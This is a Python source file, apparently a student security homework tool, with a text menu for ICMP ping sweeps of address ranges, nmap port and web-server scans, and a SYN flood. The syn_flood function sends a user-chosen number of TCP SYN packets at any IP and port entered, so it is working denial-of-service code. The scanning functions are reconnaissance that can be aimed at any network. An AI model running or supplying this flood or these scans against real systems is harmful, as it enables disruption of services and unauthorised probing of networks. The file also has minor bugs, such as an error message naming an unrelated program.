from scapy.all import sr1, send
from scapy.layers.inet import ICMP, IP, TCP
from scapy.layers.inet import RandShort
import sys
import re
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser
import nmap
import os


class NetworkUtils:
    def icmp_echo(self, dst_given):
        # regular expression for notation
        reg_ex_normal = re.compile('\d+\.+\d+\.+\d+\.+\d+\Z')
        reg_ex_all = re.compile('\d+\.+\d+\.+\d+\.+\*')
        reg_ex_range = re.compile('\d+\.+\d+\.+\d+\.+\d+-+\d')
        live_hosts = ""

        def ping(dst_given_ip):
            pck = IP(dst=dst_given_ip) / ICMP()
            rcv = sr1(pck)
            if rcv is not None:
                return dst_given_ip + "\t"
            else:
                down_host = dst_given + " is down\n"
                print(down_host)

        if reg_ex_normal.search(dst_given) is not None:
            print(dst_given)
            temp_host = ping(str(dst_given))
            if temp_host is not None:
                live_hosts += temp_host
        elif reg_ex_range.search(dst_given) is not None:
            dst_ip = reg_ex_range.search(dst_given).group().split('-')
            dst_ip_copy = list(str(dst_ip[0]))
            dst_ip_range = int(dst_ip_copy.pop(-1))
            dst_ip_range2 = int(dst_ip[1])
            dst_ip = ''.join(dst_ip_copy)
            for i in range(dst_ip_range, dst_ip_range2 + 1):
                print(dst_ip + str(i))
                temp_host = ping(str(dst_ip) + str(i))
                if temp_host is not None:
                    live_hosts += temp_host
        elif reg_ex_all.search(dst_given) is not None:
            dst_given = reg_ex_all.search(dst_given).group()
            dst_ip = dst_given.split("*")
            dst_ip = ''.join(dst_ip)
            for i in range(0, 256):
                print(dst_ip + str(i))
                temp_host = ping(str(dst_ip) + str(i))
                if temp_host is not None:
                    live_hosts += temp_host
        else:
            print("Your notation not right check it " + dst_given)
        NetworkUtils.make_file_path(self, name="icmp", data=live_hosts)
        print(live_hosts)
        p = sr1(IP(dst=dst_given) / ICMP())

    def port_identification(self):
        port_info = ""
        live_hosts = ""
        reg_ex_normal = re.compile('\d+\.+\d+\.+\d+\.+\d')
        data = NetworkUtils.read_file(self, name="icmp")
        ip_addresses = reg_ex_normal.findall(data)

        nm = nmap.PortScanner()
        for ip in ip_addresses:
           nm.scan(ip, "22-443")
           nm.all_hosts()
           for host in nm.all_hosts():
             print('----------------------------------------------------')
             print('Host : %s (%s)' % (host, nm[host].hostname()))
             print('State : %s' % nm[host].state())
             for proto in nm[host].all_protocols():
                 print('----------')
                 print('Protocol : %s' % proto)

                 lport = nm[host][proto].keys()
                 for port in lport:
                     port_info += str('port:' + str(port) + "\n")

             NetworkUtils.make_file_path(self, name="ports", data=port_info)


    def make_file_path(self, name, data):
        file = open(os.getcwd() + "/" + name + ".dat", "w+")
        file.write(data)

    def read_file(self, name):
        file = open(os.getcwd() + "/" + name + ".dat", "r")
        return file.read()

    def web_server_detection(self, dst_given):
        nm = nmap.PortScanner()
        nm.scan(dst_given, arguments="-p 20-443")
        print(nm.csv())
        NetworkUtils.make_file_path(self, name="web", data=nm.csv())

    def syn_flood(self, dst_given, port, count):
        i = 0
        print("Syn flood starting")
        while i != count:
            syn_packet = IP(dst=dst_given) / TCP(flags="S", sport=RandShort(), dport=int(port))
            send(syn_packet)
            i += 1
        print("Syn flood end")

def main(): 
    nm = NetworkUtils()
    x, y, z = "", "", ""
    print("Welcome to crpyo_hw3")
    while x != "exit":
        print("---------------------------------------------------")
        print("1-Icmp echo ping")
        print("2-Port identification")
        print("3-Web server detection")
        print("4-SYN flood")
        print("5-Show files")
        print("exit terminate program")
        x = input("Enter number you want to start\n")
        print("---------------------------------------------------")
        if x == "1":
            print("Icmp ping usage ip_address or ip_address_range(ends like 205-8) or full scan ip_address.* ")
            print("Enter ip address")
            y = input()
            nm.icmp_echo(dst_given=y)
            print("Live hosts save as icmp.dat in NetworkTools.py directory")
        elif x == "2":
            print("Port usage reads icmp.dat and find ports")
            nm.port_identification()
            print("Live hosts and ports save as ports.dat in NetworkTools.py directory")
        elif x == "3":
            ip_addresses = []
            z = input("Give ip address for web server scan\n")
            nm.web_server_detection(dst_given=z)
            print("Web server scan completed")
        elif x == "4":
            reg_ex_normal = re.compile('\d+\.+\d+\.+\d+\.+\d')
            print("Syn flood enter ip address,port and number of attacks you can observe it wireshark or tcpdump")
            x = input("Enter ip address\n")
            y = input("Enter port\n")
            z = input("Enter number of attack\n")
            if reg_ex_normal.search(x) is not None:
                nm.syn_flood(dst_given=x, port=int(y), count=int(z))
            else:
                print("You entered wrong style ip this should be like 192.168.1.1 you type " + x)
        elif x == "5":
            file = ['icmp', 'ports', 'web']
            for i in file:
                read = nm.read_file(name=i)
                print(i + ".dat" + "\n" + read)
        elif x == "exit":
            sys.exit()
        print("---------------------------------------------------")


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print("Error occured while executing simple_des reason is {}".format(e))
        pass
